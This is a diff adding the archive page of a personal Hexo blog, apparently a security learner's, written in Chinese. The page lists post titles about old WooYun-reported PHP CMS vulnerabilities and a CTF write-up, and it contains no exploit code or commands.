+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-archive" >目前才写: 15 篇博文，好好努力吧，骚年。 </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2017 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2017/12/08/wooyun-1000php-10/" >HZCMS 合正网站群内容管理系统SQL注射漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2017/12/08/wooyun-1000php-8/" >phpcms2008本地文件包括及利用（执行任意SQL脚本）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2017/12/08/wooyun-1000php-11/" >Ecshop2.7.2持久型XSS（可获得管理员帐号）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2017/12/08/wooyun-1000php-12/" >游戏风云cms存在SQL注入</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2017/12/08/wooyun-1000php-13/" >dedecms v5.3-v5.6 Get Shell</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2017/12/08/wooyun-1000php-9/" >PHP168 V6.02整站系统远程执行任意代码漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2017/12/08/wooyun-1000php-7/" >phpwind远程代码执行漏洞-2010.09</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2017/12/08/wooyun-1000php-4/" >Discuz!漫游插件API本地包含漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2017/12/08/wooyun-1000php-6/" >phpcms 2008 sp4 爆路径及任意文件删除漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2017/12/08/wooyun-1000php-5/" >PHPCMS通杀XSS-2010.08</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/07</span><a class="archive-post-title" href= "/2017/12/07/wooyun-1000php-3/" >ecshop SQL注射漏洞-2010.8.21</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/07</span><a class="archive-post-title" href= "/2017/12/07/wooyun-1000php-2/" >Discuz！7.2/X1 第三方心情墙插件SQL注入及持久型XSS漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/07</span><a class="archive-post-title" href= "/2017/12/07/wooyun-1000php-1/" >BlueCMS v1.6 sp1 ad_js.php SQL注入漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/26</span><a class="archive-post-title" href= "/2017/11/26/hxctf2017-writeup/" >hxctf2017-writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/24</span><a class="archive-post-title" href= "/2017/11/24/blog/" >My blog</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name"><a href= "#">小试牛刀</a></span>
+    
+        <span class="sidebar-tag-name"><a href= "#">wooyun-1000php</a></span>
+    
+    </div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #888; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tag-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var jsInfo = {
+        root: '/'
+    }
+</script>
+    <!-- 不蒜子  -->
+    
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ统计  -->
+    
+    </div>
+    </body>
+</html>
+
+
